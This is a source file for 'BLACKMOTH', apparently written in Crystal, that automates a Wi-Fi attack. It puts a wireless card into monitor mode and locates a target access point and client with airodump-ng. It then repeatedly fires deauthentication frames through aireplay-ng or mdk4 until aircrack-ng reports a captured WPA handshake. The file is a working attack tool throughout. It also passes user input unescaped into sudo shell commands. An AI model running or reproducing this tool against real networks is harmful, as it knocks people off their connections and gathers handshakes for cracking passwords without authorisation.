require "json"
require "colorize"

def startup_banner()
  puts "

  ▄▀▀█▄▄   ▄▀▀▀▀▄      ▄▀▀█▄   ▄▀▄▄▄▄   ▄▀▀▄ █  ▄▀▀▄ ▄▀▄  ▄▀▀▀▀▄   ▄▀▀▀█▀▀▄  ▄▀▀▄ ▄▄  
 ▐ ▄▀   █ █    █      ▐ ▄▀ ▀▄ █ █    ▌ █  █ ▄▀ █  █ ▀  █ █      █ █    █  ▐ █  █   ▄▀ 
   █▄▄▄▀  ▐    █        █▄▄▄█ ▐ █      ▐  █▀▄  ▐  █    █ █      █ ▐   █     ▐  █▄▄▄█  
   █   █      █        ▄▀   █   █        █   █   █    █  ▀▄    ▄▀    █         █   █  
  ▄▀▄▄▄▀    ▄▀▄▄▄▄▄▄▀ █   ▄▀   ▄▀▄▄▄▄▀ ▄▀   █  ▄▀   ▄▀     ▀▀▀▀    ▄▀         ▄▀  ▄▀  
 █    ▐     █         ▐   ▐   █     ▐  █    ▐  █    █             █          █   █    
 ▐          ▐                 ▐        ▐       ▐    ▐             ▐          ▐   ▐", "\n\n"
end     

def config_banner()
  system "clear"
  puts ""
  print `echo "\t        ___,-------.___"`.colorize.light_yellow
  print `echo "\t     ,--'             '--."`.colorize.light_yellow
  print `echo '\t    /                     \\\'`.colorize.light_yellow
  print `echo '\t   /                       \\\'`.colorize.light_yellow
  print `echo "\t  |                         |"`.colorize.light_yellow
  print `echo "\t |                           |"`.colorize.light_yellow
  print `echo "\t |        |~~~~~~~~~|        |"`.colorize.light_yellow
  print `echo "\t |        \\         /        |"`.colorize.light_yellow
  print `echo "\t  |        \\       /        |"`.colorize.light_yellow
  print `echo "\t   \\        \\     /        /"`.colorize.light_yellow
  print `echo "\t    \\        |   |        /"`.colorize.light_yellow
  print `echo "\t     \\       |   |       /"`.colorize.light_yellow
  print `echo "\t      \\      |   |      /"`.colorize.light_yellow
  print `echo "\t       \\     |   |     /"`.colorize.light_yellow
  print `echo "\t        \\____|___| ___/"`.colorize.light_yellow
  print `echo "\t        )___,-----'___("`
  print `echo "\t        )___,-----'___("`
  print `echo "\t        )___,-----'___("`
  print `echo "\t        )___,-----'___("`
  print `echo "\t        \\_____________/"`
  print `echo "\t             \\___/',"`
  puts "\n\t   BLACKMOTH Config Generator",""
  puts "\t\t   Version 1a".colorize.light_red
end

def createConfig()
  config_banner()
  print "\n[~]".colorize.light_magenta
  print " Enter BSSID > "
  inputBSSID = gets(chomp=true)
  print "\n[~]".colorize.light_magenta
  print " Enter Client MAC > "
  inputClient = gets(chomp=true)
  print "\n[~]".colorize.light_magenta
  print " Enter Wifi Interface name > "
  inputWifi = gets(chomp=true)
  print "\n[~]".colorize.light_magenta
  print " Enter Deauth pause interval > ", ""
  inputWait = gets(chomp=true)
  print "\n[~]".colorize.light_magenta
  print " Enter Deauth tool (air/mdk4) > ", ""
  inputTool = gets(chomp=true) 
  if inputTool == "air"
      #continue
  elsif inputTool == "mdk4"
      #continue
  else
      puts "[!] Improper tool selected! Exiting..".colorize.light_red
      exit()
  end
  if File.exists?("/usr/share/BLACKMOTH/config.json")
    `sudo rm /usr/share/BLACKMOTH/config.json`
  end
  `sudo touch /usr/share/BLACKMOTH/config.json`
  `sudo echo '{' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '    "bssid": "#{inputBSSID}",' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '    "client": "#{inputClient}",' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '    "wifi_card": "#{inputWifi}",' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '    "deauth_wait_time": "#{inputWait}",' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '    "deauth_tool": "#{inputTool}"' >> /usr/share/BLACKMOTH/config.json`
  `sudo echo '}' >> /usr/share/BLACKMOTH/config.json`
  puts "\n[!] Config generated".colorize.light_green, ""
  puts `sudo cat /usr/share/BLACKMOTH/config.json`
  print "\n", "[~]".colorize.light_magenta
  puts " config.json file updated successfully!", ""
end

class Master
    # Class init
    def initialize()
        @json_object = JSON.parse(File.read("/usr/share/BLACKMOTH/config.json"))
    end
    # Banner creator
    def banner()
        system "clear"
        puts "", ""
        print "\t"
        print "███   █    "
        print "██   ▄█▄    █  █▀ ".colorize.red
        puts "█▀▄▀█ ████▄    ▄▄▄▄▀ ▄  █  "
        print "\t"
        print "█  █  █    "
        print "█ █  █▀ ▀▄  █▄█ ".colorize.red
        puts "  █ █ █ █   █ ▀▀▀ █   █   █"
        print "\t"
        print "█ ▀ ▄ █    "
        print "█▄▄█ █   ▀  █▀▄ ".colorize.red  
        puts "  █ ▄ █ █   █     █   ██▀▀█"
        print "\t"
        print "█  ▄▀ ███▄ "
        print "█  █ █▄  ▄▀ █  █ ".colorize.red 
        puts " █   █ ▀████    █    █   █ "
        print "\t"
        print "███       "
        print "▀   █ ▀███▀    █ ".colorize.red  
        puts "     █          ▀        █  "
        print "\t"
        print "             " 
        print "█         ▀     ".colorize.red
        puts "  ▀                   ▀   "
        print "\t"
        puts "            ▀           ".colorize.red
        print "\t"
        puts "   - HANDSHAKES FASTER THAN DADS AT THANKSGIVING -".colorize.light_red
        puts ""
        puts "\t\t\t   -Version 2a-"
    end
    # Deauth banner
    def moth()
      puts "
    \t                   '         '
    \t   .,,,             '       '             ,,,.
    \t   'YES8888bo.       :     :       .od8888YES'
    \t     888IO8DO88b.     :   :     .d8888I8DO88
    \t     8LOVEY'  'Y8b.   '   '   .d8Y'  'YLOVE8
    \t    jTHEE!  .db.  Yb. '   ' .dY  .db.  8THEE!
    \t      '888  Y88Y    'b ( ) d'    Y88Y  888'
    \t       8MYb  '`        ,',        `'  dMY8
    \t      j8prECIOUSgf`'   ':'   '`?g8prECIOUSk
    \t        'Y'   .8'     d' 'b     '8.   'Y'
    \t         !   .8' db  d'; ;'b  db '8.   !
    \t            d88  ''  8 ; ; 8  '''  88b
    \t           d88Ib   .g8 ',' 8g.   dI88b
    \t          :888LOVE88Y'     'Y88LOVE888:
    \t          '! THEE888'       '888THEE !'
    \t             '8Y  'Y         Y'  Y8'
    \t              Y                   Y
    \t              !                   !"
    end
    # Sets monitor mode
    def monset()
        # Find interface on system
        iface = @json_object["wifi_card"]
        puts "\n>>> Placing #{iface} into monitor mode".colorize.light_green
        checker = `sudo iw dev | awk '$1=="Interface"{print $2}'`
        checkerArray = checker.split("\n")
        if !checkerArray.includes? (iface)  
          puts "\n[!] #{iface} not found".colorize.light_red
          exit()
        end
        # Begin our process
        `sudo airmon-ng check kill >/dev/null`
        `sudo ip link set #{iface} down`
        `sudo iw dev #{iface} set type monitor`
        `sudo ip link set #{iface} up`
        puts "", `sudo iwconfig #{iface}`
        # Verify monitor mode
        finalMon = `sudo iwconfig #{iface} | grep Mode:Monitor`
        if finalMon == ""
          puts "Wireless card failed to enter monitor mode"
          exit()
        end
    end
    # Locates our BSSID
    def findBSSID()
      #Creates the first capture as a child
      child_pid = Process.fork() do
        puts ">> Starting airodump-ng survey".colorize.light_magenta, ""
        #Grabs wifi interface from json
        iface = @json_object["wifi_card"]
        #Starts the airodump process
        puts `sudo airodump-ng -w findBSSID --band abg --output-format csv #{iface}`
        Signal::INT.trap() do
          puts "Signal caught. Exiting cleanly."
          exit()
        end
        loop do end
      end

      # Doesnt continue until airodump creates the file
      forever = true
      while forever == true
        if File.exists?("findBSSID-01.csv")
          forever = false
        end
      end
      #This will scan the .csv file for our target bssid
      scanning = true
      dotCounter = 0
      while scanning == true
        bssid = @json_object["bssid"].to_s
        sleep 1
        if dotCounter < 1
          print "[~] Waiting for BSSID"
          dotCounter +=1
        else
          print "."
          dotCounter +=1
        end
        #If found, send a kill command to our child process
        if File.read("findBSSID-01.csv").includes?(bssid)
          puts " // BSSID #{bssid} has been found! ".colorize.light_green, ""
          print "[~] Processing channel information.. ", ""
          channel_check = true
          while channel_check == true
            channel_num = `grep -m 1 '#{bssid}' findBSSID-01.csv | awk -F , '{print $4}'`.strip
            if channel_num == "-1"
              #continue
            else
              print "// Channel ".colorize.light_green
              print channel_num.colorize.light_green
              puts " found".colorize.light_green, ""
              channel_check = false
            end
          end
          child_pid.signal(Signal::KILL)
          scanning = false
        end
      end
      # Launch FIND CLIENT
      findClient(channel_num)
    end

    def findClient(channel_info)
      channel_num = channel_info
      #Creates the first capture as a child
      child_pid = Process.fork() do
        puts ">> Locating target client".colorize.light_magenta, ""
        #Grabs wifi interface from json
        iface = @json_object["wifi_card"].to_s
        bssid = @json_object["bssid"].to_s
        #Starts the airodump process
        puts `sudo airodump-ng -w findCLIENT --channel #{channel_info} --bssid #{bssid} --output-format csv #{iface}`
        Signal::INT.trap() do
          puts "Signal caught. Exiting cleanly."
          exit()
        end
        loop do end
      end
      
      # Doesnt continue until airodump creates the file
      forever = true
      while forever == true
        if File.exists?("findCLIENT-01.csv")
          forever = false
        end
      end
      #This will scan the .csv file for our target bssid
      scanning = true
      dotCounter = 0
      while scanning == true
        client = @json_object["client"].to_s
        sleep 1
        if dotCounter < 1
          print "[~] Waiting for Client"
          dotCounter +=1
        else
          print "."
          dotCounter +=1
        end
        #If found, send a kill command to our child process
        if File.read("findCLIENT-01.csv").includes?(client)
          puts " // Client #{client} has been found! ".colorize.light_green, ""
          child_pid.signal(Signal::KILL)
          scanning = false
        end
      end
      #Starts deauthClient function
      deauthClient(channel_num)
    end

    def deauthClient(channel_info)
      # Set global run varibale
      running = true
      tool = @json_object["deauth_tool"].to_s
      dwait = @json_object["deauth_wait_time"].to_s
      iface = @json_object["wifi_card"].to_s
      bssid = @json_object["bssid"].to_s
      client = @json_object["client"].to_s
      system "clear"
      moth()
      #Creates the first capture as a child
      child_pid = Process.fork() do
        puts ">> Deauthing target client".colorize.light_magenta, ""
        #Grabs wifi interface from json
        #Starts the airodump process
        puts `sudo airodump-ng -w deauthCLIENT --channel #{channel_info} --bssid #{bssid} --output-format cap #{iface}`
        Signal::INT.trap() do
          puts "Signal caught. Exiting cleanly."
          exit()
        end
        loop do end
      end
      # Sleep to allow airdump-ng to create its file
      puts "\n[!] Firing up the turbos..".colorize.light_yellow, ""
      # Doesnt continue until airodump creates the file
      forever = true
      while forever == true
        if File.exists?("deauthCLIENT-01.cap")
          forever = false
        end
      end

      while running == true
        case tool
        when "air"
          puts "\n>>> Starting aireplay-ng (⊙︿⊙✿)".colorize.light_red, ""
          puts `sudo aireplay-ng --deauth 1 -a #{bssid} -c #{client} -D #{iface}`
          puts `sleep #{dwait}`
        when "mdk4"
          puts "\n>>> Starting mdk4 (⊙_⊙✿)".colorize.light_red, ""
          puts `sudo timeout -k #{dwait.to_i + 5} #{dwait.to_i + 5} mdk4 #{iface} d -c #{channel_info} -s 1 -B #{bssid} -S #{client}`
        else
          puts "[!] Improper deauth tool configuration, exiting..".colorize.red
          exit()
        end
        #find_handshake, wait for 3 to allow airodump file to populate
        current_val = `aircrack-ng deauthCLIENT-01.cap | awk -F 'WPA ' '{print $2}'`.strip
        correct_val = "(1 handshake)"
        correct_val2 = "(1 handshake, with PMKID)"
        #If found, kill airodump
        if current_val.to_s == correct_val
          running = false
        elsif current_val.to_s == correct_val2
          running = false
        # Otherwise continue
        else
          puts ""
          print ">>".colorize.light_yellow
          print " Handshake not found yet.."
          current_val = ""
          print " Sleeping for ","#{dwait}".colorize.red, " seconds"
          puts ""
          if dwait.to_i <= 1
            puts `sleep 1`
          else
            puts `sleep #{dwait.to_i - 1}`
          end
        end
      end
      puts ""
      print "[!!!] Handshake is found! (✿◠‿◠) ".colorize.light_magenta
      puts " #{current_val.to_s}", ""
      child_pid.signal(Signal::KILL)
      puts "Waiting for airodump (PID: #{child_pid}) to finish...", ""
    end
# End of class
end

def main()
    begin
      # Check if root
      rootCheck = `whoami`.strip
      if rootCheck != "root"
        puts ""
        STDERR.print "Run this as root, dingus (≖︿≖✿)".colorize.red
        exit()
      end
      # Cleanup old survey(s)
      `sudo rm -rf findBSSID*`
      `sudo rm -rf findCLIENT*`
      `sudo rm -rf deauthCLIENT*`

      # Check for config file && run if not present
      if !Dir.exists?("/usr/share/BLACKMOTH")
         `sudo mkdir /usr/share/BLACKMOTH`
          createConfig()
      elsif !File.exists?("/usr/share/BLACKMOTH/config.json")
          createConfig()
      elsif File.exists?("/usr/share/BLACKMOTH/config.json")
          system "clear"
          startup_banner()
          print "[?]".colorize.light_magenta
          print " Do you wish to create a new config?\n"
          print "\n1. Yes\n2. No\n\n"
          print "[BLACKMOTH] > ".colorize.light_green
          question = gets(chomp=true)
          if question == "1"
            createConfig()
          end
      end
      # Unleash the moth
      🔥 = Master.new()
      🔥.banner
      🔥.monset
      🔥.findBSSID
    ensure
      startup_banner()
      puts "\t\t\t     Stay away from the light".colorize.red, ""
      exit()
    end
end

main()
